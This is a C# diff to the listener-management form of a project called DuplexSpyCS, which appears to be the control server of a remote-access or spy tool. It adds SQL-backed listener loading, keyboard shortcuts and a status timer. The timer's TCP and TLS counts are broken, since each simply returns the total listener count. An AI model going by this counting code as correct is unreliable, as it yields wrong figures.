@@ -7,6 +7,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Xml.Linq;
 
 namespace DuplexSpyCS
 {
@@ -62,7 +63,7 @@ namespace DuplexSpyCS
                             listener = new clsHttpListener(config.szName, config.nPort, config.szDescription);
                             break;
                         default:
-                            
+
                             break;
                     }
 
@@ -78,17 +79,19 @@ namespace DuplexSpyCS
             }
             else
             {
-                foreach (string szName in m_dicListener.Keys)
+                var ls = m_sqlConn.fndtGetAllListener();
+                foreach (var config in ls)
                 {
-                    clsListener listener = m_dicListener[szName];
-                    stListenerConfig config = m_sqlConn.fnGetListener(szName);
+                    clsListener listener = null;
+                    m_dicListener.TryGetValue(config.szName, out listener);
 
-                    ListViewItem item = new ListViewItem(szName);
+                    ListViewItem item = new ListViewItem(config.szName);
                     item.SubItems.Add(config.enProtocol.ToString());
                     item.SubItems.Add(config.nPort.ToString());
                     item.SubItems.Add(config.szDescription);
                     item.SubItems.Add(config.dtCreationDate.ToString("F"));
-                    item.SubItems.Add(listener.m_bIslistening ? "Opened" : "Closed");
+
+                    item.SubItems.Add((listener != null && listener.m_bIslistening) ? "Opened" : "Closed");
 
                     item.Tag = config;
 
@@ -132,7 +135,7 @@ namespace DuplexSpyCS
         {
             fnLoadListener();
 
-            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
+            timer1.Start();
         }
 
         private void frmListener_Load(object sender, EventArgs e)
@@ -202,6 +205,8 @@ namespace DuplexSpyCS
                 frmListenerEdit f = new frmListenerEdit(config, m_sqlConn);
 
                 f.ShowDialog();
+
+                fnLoadListener();
             }
         }
 
@@ -231,7 +236,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 var listener = fnGetListenerFromItem(item);
-                
+
                 if (!listener.m_bIslistening)
                     listener.fnStart();
             }
@@ -256,7 +261,69 @@ namespace DuplexSpyCS
         //Stop All
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
-            fnStopAll();   
+            fnStopAll();
+        }
+
+        private void listView1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Modifiers == Keys.Control)
+            {
+                if (e.KeyCode == Keys.A)
+                {
+                    foreach (ListViewItem item in listView1.Items)
+                        item.Selected = true;
+                }
+            }
+            else
+            {
+                if (e.KeyCode == Keys.F5)
+                {
+                    fnLoadListener();
+                }
+                else if (e.KeyCode == Keys.Delete)
+                {
+                    foreach (ListViewItem item in listView1.SelectedItems)
+                    {
+                        var listener = m_dicListener[item.Text];
+                        if (listener.m_bIslistening)
+                            listener.fnStop();
+
+                        if (!m_sqlConn.fnbDeleteListener(item.Text))
+                        {
+                            MessageBox.Show("Cannot delete listener: " + item.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }
+
+                        m_dicListener.Remove(item.Text);
+                    }
+
+                    fnLoadListener();
+                }
+                else if (e.KeyCode == Keys.Enter || e.KeyCode == Keys.Space)
+                {
+                    var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
+                    if (lConfig.Count == 0)
+                        return;
+
+                    frmListenerEdit f = new frmListenerEdit(lConfig.First(), m_sqlConn);
+
+                    f.ShowDialog();
+                }
+            }
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            List<clsListener> ls = m_dicListener.Values.ToList();
+            int nTCP = ls.Select(x => x.m_protocol == enListenerProtocol.TCP).ToList().Count;
+            int nTLS = ls.Select(x => x.m_protocol == enListenerProtocol.TLS).ToList().Count;
+
+            Text = $"Listener | TCP[{nTCP}], TLS[{nTLS}]";
+            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
+        }
+
+        private void frmListener_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            timer1.Stop();
         }
     }
 }
